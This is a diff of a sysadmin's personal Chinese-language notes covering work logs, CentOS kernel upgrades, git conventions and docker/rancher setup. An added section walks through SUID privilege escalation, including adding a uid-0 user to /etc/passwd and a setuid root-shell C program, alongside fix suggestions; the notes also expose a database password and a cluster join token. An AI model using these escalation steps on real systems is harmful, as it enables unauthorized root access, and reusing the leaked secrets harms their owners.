@@ -61,6 +61,7 @@ change master to master_host='192.168.10.108',master_user='root',master_password
 grant replication slave,replication client on *.* to root@'192.168.10.107' identified by 'sks123.com';
 
 firewall-cmd --zone=public --add-port=9999/tcp --add-port=8848/tcp --add-port=3000/tcp --add-port=8012/tcp --add-port=4000/tcp --add-port=9000/tcp --add-port=4000-5000/tcp --permanent
+firewall-cmd --zone=public --remove-port=33060/tcp --permanent
 
 /usr/local/mysql/bin/mysqldump -u$user -p$passwd  information_schema --skip-lock-tables         > "$backup_dir/"information_schema_"$time.sql"
 
@@ -126,50 +127,45 @@ weekly：
 
 - 已完成：
 
-1.
-2. 会议系统:
+1. 会议系统:
+    1. 新津人大，安装pad端app
 
 ---
 
 - 其他：
 
-1.
+1. 西藏221.236.26.68， 清理服务器存储
+2. 网站备案，填写模板《IP地址报备申请模板(2018.9.6版本）0303》
 
 - 未完成：
 
 ---
+
 - 下周计划：
 运维工作;
 项目上的安排
 
-
 - 进行中：
+
 1. centos，整理笔记
     1. 用xmind整理下更好，梳理下
 
-1. docker 技术入门到实践第3版,补充一下 docker_mk.txt 文档
+2. docker 技术入门到实践第3版,补充一下 docker_mk.txt 文档
+    **最迟这周了！！！！！！！！！**
+
     1. 可以把西藏项目用到的试试写个dockerfile，比如 微心愿
     2. 最近部署smartone测试环境，可以搞个dockerfile，就不必这么麻烦了
 
-2. smartone， 环境部署脚本， 方便其他客户（比如，windows） 快速搭建部署环境
+3. smartone， 环境部署脚本， 方便其他客户（比如，windows） 快速搭建部署环境
     版本信息，
 
-        ~~`mariadb， Server version: 10.1.48-MariaDB MariaDB Server`~~
-        ~~`java， openjdk version "1.8.0_272"`~~
-        ~~`minio, version RELEASE.2020-11-19T23-48-16Z`~~
-        **`nginx, nginx version: nginx/1.8.1`**
-        ~~`kkfile, wget https://kkfileview.keking.cn/kkFileView-2.2.1.tar.gz`~~
-        `redis, Redis server v=5.0.5 sha=00000000:0 malloc=jemalloc-5.1.0 bits=64 build=f3676dc6baceb8a`
-
-3. ~~曾国藩- 诫子书~~
+    **nginx,nginx version:nginx/1.8.1**
 
 4. 完善下jianli? 应该是在硬盘里头
-    5. 写下安装smartone 环境脚本/
 
+---
 
-
-
-
+1. 运维/devops 技术栈？
 2. 内核有点难。搭建实验环境，好像也不太顺利，这个坑慢慢填
 
 3. linux_security， 服务器安全方面、安全加固， 的一些操作， **能深入实践更好**
@@ -282,19 +278,16 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
     docker images | sort -n -k 10r -t ' '
 2. 192.168.10.62，还未拉取镜像，因为上面运行有其他mino 等容器。待确认后，再操作
 
-
-6. 要创建一个集群，则需要提供一台主机，用作执行命令，用来创建rancher-agent，rancher/rancher-agent:v2.5.3，就下面这个
+3. 要创建一个集群，则需要提供一台主机，用作执行命令，用来创建rancher-agent，rancher/rancher-agent:v2.5.3，就下面这个
     sudo docker run -d --privileged --restart=unless-stopped --net=host -v /etc/kubernetes:/etc/kubernetes -v /var/run:/var/run registry.cn-hangzhou.aliyuncs.com/rancher/rancher-agent:v2.5.3 --server https://192.168.10.62 --token 2bpf9cfsfmdmh2n4pc555lntcrr2jx4ppmwkt5tc9b97zsv5pnmn42 --ca-checksum df3f8a359b9a6daf65468988b37cc689901ebe8637d2039349fcbbdd1c9a968e --etcd --controlplane --worker
     1. 若不执行，你的集群就会提示，Waiting for etcd and controlplane nodes to be registered
 
-7. 
-    uname -r` ,`cat /etc/redhat-release
+4. uname -r` ,`cat /etc/redhat-release
     rpm -import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org
     rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm
     yum list installed | grep kernel*                   查看已安装的内核软件
     tar -zxvf linux-5.5.9.tar.gz  -C /usr/local 
     yum install elfutils-libelf-devel bc ncurses-devel flex bison -y
-
 
     lspci -v                查看使用的网卡驱动（内核默认使用的网卡驱动r8169，但实际网卡是r8168）
         `yum whatprovides */lspci`                      yum查看lspci 的所属软件包
@@ -305,7 +298,7 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
 
     awk -F\' '$1=="menuentry " {print $2}' /etc/grub2.cfg 查看grub中默认的内核版本
 
-1. linux命令行，^替换掉上调命令的部分内容
+5. linux命令行，^替换掉上调命令的部分内容
     zsh里头，需要按tab将内容给你补充显示出来，要不回车后，他还是需要你确认的
     1. ^old^new             换掉输错或输少的部分
         ansible vod -m command -a 'uptim'       如果是uptimee，就不好说了？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
@@ -344,13 +337,13 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
 
     8. 使用`` 或者 $() 做命令替换； 嵌套时，$()可读性更清晰
 
-2. 查看服务器CPU，运存情况
+6. 查看服务器CPU，运存情况
     1. cat /proc/cpuinfo  | grep processor | wc -l      4个CPU处理器
         cat /proc/cpuinfo | grep cores                  每个CPU含4个核心，所以是，16核处理器
         或者通过lscpu，CPU(s): 4,   Core(s) per socket: 4， Socket(s): 1，      所以，其逻辑CPU的数量就是Socket*core*thread  也就是threads
     2. 
 
-3. 通过端口查找进程PID，通过PID查找端口，就这几个命令
+7. 通过端口查找进程PID，通过PID查找端口，就这几个命令
     ps -ef | grep 9090
     ss -tulnp | grep 9090
     lsof -n -i :9090 | grep -i listen 
@@ -363,12 +356,12 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
     经发现，该容器映射的端口为，0.0.0.0:9090->9090/tcp，    这也说明以后尽量不要将容器内和映射端口搞成一致的。
     3. systemctl status 24010，                         显示Active: active(running) 
     systemctl status 24045，                            提示，Failed to get unit for PID 24045: PID 24045 does not belong to any loaded unit.
-    4. 
+    4.
 
-4. centos7安装sql-server，
-    参考，https://blog.51cto.com/13770206/2429881
+8. centos7安装sql-server，
+    [参考](https://blog.51cto.com/13770206/2429881)
 
-5. centos7内核相关，记录
+9. centos7内核相关，记录
     1. cat /boot/grub2/grub.cfg |grep menuentry         查看系统可用内核
     2. uname -sr                                         查看当前内核
     3. grub2-set-default 'CentOS Linux (3.10.0-1160.xxxx) 7 (Core)'          修改开机时默认使用的内核
@@ -389,37 +382,79 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
         rpm -qa | grep kernel                                               查看系统中全部的内核RPM包
         yum remove xxxx                                                     卸载旧内核（不需要）的RPM包
 
-6. lsblk -f                                             查看磁盘UUID
+10. lsblk -f                                             查看磁盘UUID
         -f, --fs                                        输出文件系统信息
-        blkid， 
-        ll /dev/disk/by-uuid/ 
+        blkid，
+        ll /dev/disk/by-uuid/
         注意，自己要挂载的是centos_data-vdb ext4， 而不是vdb，因为你已经分区了，UUID就应该是分区后的那块盘
 
-7. linux系统架构从外到内，可以分为，应用层（封装起来的shell）、 shell、 kernel、 hardware
-8. Git， 七大基本原则
+11. linux系统架构从外到内，可以分为，应用层（封装起来的shell）、 shell、 kernel、 hardware
+12. Git， 七大基本原则
     1. 每次commit只做一件事。 linux中心原则是，所有更改都必须分解为小步骤进行。针对某一项单一任务的更改
     2. commit不能破坏构建。 不仅应该将所有更改分解为尽可能小的变量（上一条），而且不能破坏内核（就内核维护而言）。 即每个步骤都必须完全起作用，并且不引起退化。
     3. 所有代码都是二等分的。 二等分是一种操作，它使开发者可以找到所有发生错误的确切时间点。 只有在遵守上面的规则的情况下，才能很好起作用。开发者可以在十几次编译/测试中，从成千上万的可能 commit 中分离出导致问题出现的 commit 。Git 甚至可以通过 git bisect 功能帮助自动化该过程
     4. 永远不要rebase 公共分支。 linux项目工作流程不允许这样，因为rebase这些公共分支后，已重新基准化的commit 将不再与 基于原存储库中的相同 commit 匹配
         在树的层次结构中，不是叶子的公共主干部分 不能重新设置基准，否则将会破坏层次结构中的下游分支。
 
-    5. git正确合并。 
+    5. git正确合并。
     6. 保留定义明确的commit 日志。 每个commit都必须是独立的， 这也应该包括与commit相应的日志。内核贡献者（就内核维护而言） 必须在更改的commit 日志中做出说明，让所有人了解与正在进行的更改相关的所有内容
         git blame来查看。编写良好的代码更改日志可以帮助确定是否可以删除改代码或如何对其进行修改
 
     7. 持续测试和集成。 linux-next是一个公共仓库，任何人都可以测试它。
 
-9. 修改之前已commit 的某次注释信息，
+13. 修改之前已commit 的某次注释信息，
     git rebase -i HEAD~3                                显示倒数三次注释。要修改哪次注释，就将前面的pick改成edit，
     git commit --amend                                  按照terminal 给出的提示，修改你要修改的注释，然后保存退出。接着回到本地最新的版本，
     git rebase --continue                               会提示， Successfully rebased and updated refs/heads/master.
     git add -A（如果你在这期间， 对文件有更改）            所以说，你在修改注释的时候，就不要改动文件了
 
-10. 拉取指定分支的代码，
-    
-    git clone -b meeting_standard_v3.0 http://192.168.10.68:8000/meeting/meeting.git
+14. 拉取指定分支的代码，
 
-11. win10环境，使用 vscode remote ssh 远程连接服务器，免密连接
+    `git clone -b meeting_standard_v3.0 http://192.168.10.68:8000/meeting/meeting.git`
+
+15. 规范使用 git commit
+
+    ```text
+    type(必须)
+    用于说明git commit的类别，只允许使用下面的标识。
+    feat：新功能（feature）。
+    fix/to：修复bug，可以是QA发现的BUG，也可以是研发自己发现的BUG。
+        fix：产生diff并自动修复此问题。适合于一次提交直接修复问题
+        to：只产生diff不自动修复此问题。适合于多次提交。最终修复问题提交时使用fix
+    docs：文档（documentation）。
+    style：格式（不影响代码运行的变动）。
+
+    refactor：重构（即不是新增功能，也不是修改bug的代码变动）。
+    perf：优化相关，比如提升性能、体验。
+    test：增加测试。
+    chore：构建过程或辅助工具的变动。
+    revert：回滚到上一个版本。
+    merge：代码合并。
+    sync：同步主线或分支的Bug。
+    ```
+
+    1. commit message 格式： <type>(<scope>): <subject>
+    2. 下面举几个例子： 按照使用频率排列
+
+    ```text
+    feat： 创建项目
+        feat： 添加数据页面xxxxxx
+    style： 修改文本格式
+    test： 用于xxxx相关测试
+    perf： 增加用户交互选项
+        perf： 修改判断语句
+    fix：  xxx详情页面，展示不全，滚动条不能xxxx
+    docs： 新增xxxx文档
+    refactor： 修改网站名字为xxxx网
+
+
+
+
+
+
+
+
+16. win10环境，使用 vscode remote ssh 远程连接服务器，免密连接
 
     cmd, ssh-keygen -t rsa,                             生成秘钥
     将win10 上的 用户/user01/.ssh/id_rsa.pub 上传到服务器的 /root/.ssh/  目录下，
@@ -427,21 +462,55 @@ unixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunixunix
 
     本来，试讲win10上面的资料mount 挂载到虚拟机 centos7mini 上去的。 现在发现，用远程服务器可以同样实现，大功告成。 不过这样的话，虽然本地资源压力减轻，但是安全性就没了。
 
-12. [ ! -n "$JAVA_HOME" ] && echo 'is null'             判断一个变量是否为空
+17. [ ! -n "$JAVA_HOME" ] && echo 'is null'             判断一个变量是否为空
 
-13. 条理清晰，有理有据
+18. 条理清晰，有理有据
 
+19. suid 提权示例，
+    1. 比如cp
+    find / -type f -perm -u=s 2>/dev/null               搜索具有suid权限的可执行文件，
+    chmod u+s /bin/cp                                   root用户给cp一个权限，做测试
+    ll /usr/bin/cp
 
+    cp /etc/passwd passwd                               普通用户，开始操作
+    openssl passwd -1 -salt l01 123456
+    echo 'l01:$1$l01$.a5onqEPLUMqiokxhSrBy.:0:0::/root/:/bin/bash' >>passwd          按照passwd 文件格式来添加一条
+    cp passwd  /etc/passwd                               将passwd 复制回去，
 
+    su - l01                                             接下来，就可以切换到新建的用户了， 并且l01用户权限为root， 已提权
+    id                                                   能看到uid, gid, uid=0(root) gid=0(root) groups=0(root)
+    cat /etc/passwd | tail -1
+    同理，awk， sed这类具有写文件权限的命令以suid权限，都可以造成提权
+    2. find suid 给find提权后，可以以 exec 参数，以root权限执行任意命令
+    chmod u+s /bin/find                                  先给一个权限， 做测试
+    find ./ -name "passwd" -exec "id" \;                 find ./ -type f -name "nohup" -exec cp '{}' /etc/passwd \;可执行任一命令
+    执行，vim 再打开文件就可以编辑平常不能编辑的文件
 
+    **修复建议： 将cp的 suid去除**
+    3. 给vim 授权限后， 一切皆文件，好开始接龙吧
+    4. 二进制程序权限滥用特权提升
+    cat > sudo.c <<eof
+    #include <stdio.h>
+    #include <sys/types.h>
+    #include <unistd.h>
+    int main(void)
+    {
+        setuid(0);
+        system("/bin/bash");
+        return 0;
+    }
+    gcc -o sudo sudo.c      chmod +s sudo
+    ./sudo                                                普通用户执行二进制文件， 就可以获取到root权限
 
+    **修复建议： 取消suid文件suid权限**
+    **合理配置nfs权限，禁止写入**
+    **清除历史记录，不直接在命令行中使用命令**
+    5. 内核提权，
+    **修复建议， 升级内核版本，使用最新版的ubuntu**
+    6. lxc提权，
+    7. docker提权
 
-
-
-
-
-
-
+20. lololo
 
 faqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaq
 
@@ -449,7 +518,7 @@ faqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfa
     /usr/bin/ld: 找不到 -lc
     collect2: 错误：ld 返回 1
     make: *** [strings-static] 错误 1
-- 解决： 
+- 解决：
     1. yum install glibc-static
 
 - 前后端分项目，后端使用 spring-boot 的项目一般都打成了jar包，需要排查问题或是修改配置的时候需要解压和打包，
@@ -459,66 +528,16 @@ faqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfaqfa
 
         1. 如果是我这种打了jar包，可以直接找到 对应的文件， vim修改内容并保存退出
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 TODO：
-1. 可以自己列一个,  作息时刻表，这名不错
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+1. 可以自己列一个,  作息时刻表，这名不错。 作息时刻表
 
 ！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
 去报工系统那个地址，添加自己的报销单。不过需要首先由PM将项目建立好~~
 
-
-
-
-
+```bash
 export JAVA_HOME=/usr/java/jdk1.8.0_271\n export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar \nexport PATH=$PATH:$JAVA_HOME/bin
 [nginx] 
 name=nginx repo 
 baseurl=http://nginx.org/packages/centos/7/$basearch/ 
 gpgcheck=0 
 enabled=1
-
